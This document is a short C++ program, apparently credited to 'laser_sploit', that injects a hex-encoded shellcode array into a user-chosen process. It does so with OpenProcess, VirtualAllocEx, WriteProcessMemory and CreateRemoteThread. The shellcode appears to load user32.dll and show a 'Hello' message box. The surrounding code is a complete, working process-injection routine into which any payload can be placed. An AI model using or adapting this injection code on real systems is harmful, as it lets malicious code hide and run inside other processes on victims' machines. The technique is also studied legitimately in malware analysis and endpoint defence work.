//interesting project of laser_sploit

char shellcode[] =  "\x55\x8b\xec\x83\xec\x14\x53\x33\xdb\xc7\x45\xf8\x48\x65\x6c"
                    "\x6c\x56\x66\xc7\x45\xfc\x6f\x00\xc7\x45\xec\x75\x73\x65\x72"
                    "\xc7\x45\xf0\x33\x32\x2e\x64\x66\xc7\x45\xf4\x6c\x6c\x88\x5d"
                    "\xf6\xe8\x69\x00\x00\x00\x8b\x40\x0c\x8b\x48\x14\x8b\x71\x28"
                    "\x8b\xd3\x0f\xb7\x06\x66\x85\xc0\x74\x1b\x0f\xb7\xc0\x8d\x76"
                    "\x02\xc1\xca\x0d\x03\xd0\x0f\xb7\x06\x66\x85\xc0\x75\xed\x81"
                    "\xfa\x17\xca\x2b\x6e\x74\x36\x8b\x09\x39\x59\x18\x75\xd1\x8b"
                    "\x4d\xf8\xba\x8e\x4e\x0e\xec\xe8\x2e\x00\x00\x00\x8d\x4d\xec"
                    "\x51\xff\xd0\x6a\x40\x8d\x4d\xf8\xba\xa8\xa2\x4d\xbc\x51\x51"
                    "\x53\x8b\xc8\xe8\x14\x00\x00\x00\xff\xd0\x5e\x5b\x8b\xe5\x5d"
                    "\xc3\x8b\x49\x10\xeb\xcf\x64\xa1\x30\x00\x00\x00\xc3\x55\x8b"
                    "\xec\x83\xec\x10\x53\x56\x8b\xf1\x89\x55\xfc\x57\x8b\x46\x3c"
                    "\x8b\x44\x30\x78\x03\xc6\x8b\x48\x24\x8b\x50\x20\x03\xce\x8b"
                    "\x58\x1c\x03\xd6\x8b\x40\x18\x03\xde\x89\x4d\xf0\x33\xc9\x89"
                    "\x55\xf4\x89\x45\xf8\x85\xc0\x74\x26\x8b\x14\x8a\x03\xd6\x33"
                    "\xff\xeb\x09\x0f\xbe\xc0\x42\xc1\xcf\x0d\x03\xf8\x8a\x02\x84"
                    "\xc0\x75\xf1\x39\x7d\xfc\x74\x12\x8b\x55\xf4\x41\x3b\x4d\xf8"
                    "\x72\xda\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x45\xf0\x0f"
                    "\xb7\x04\x48\x8b\x04\x83\x03\xc6\xeb\xeb";
 
int _tmain(int argc, _TCHAR* argv[])
{
    DWORD pID;
    std::cout << "Enter proccess id:\n";
    std::cin >> pID;
 
    //open process with proper access permissions
    HANDLE hHandle = NULL;
    hHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pID);
 
    //check if OpenProcess succeeded
    if (hHandle == INVALID_HANDLE_VALUE)
    {
        printf("[!] Error, cannot open procces!");
        return -1;
    }
       
 
    //allocate memory for our shellcode in the desired process's address space
    LPVOID lpShellcode = NULL;
    lpShellcode = VirtualAllocEx(hHandle, 0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
    //check if VirtualAllocEx succeeded
    if (lpShellcode == NULL) {
        printf("[!] Error, cannot allocate memory!");
        CloseHandle(hHandle);
        return -1;
    }
 
    printf("[*] Injecting shellcode...\n");
    WriteProcessMemory(hHandle, lpShellcode, shellcode, sizeof(shellcode), 0);
 
    printf("[*] Running shellcode...\n");
    // create a thread which will execute our shellcode
    HANDLE hThread = CreateRemoteThread(hHandle, NULL, 0, (LPTHREAD_START_ROUTINE)lpShellcode, NULL, 0, 0);
 
    if (hThread == NULL) {
        CloseHandle(hHandle);
        return -1;
    }
 
    return 0;
}
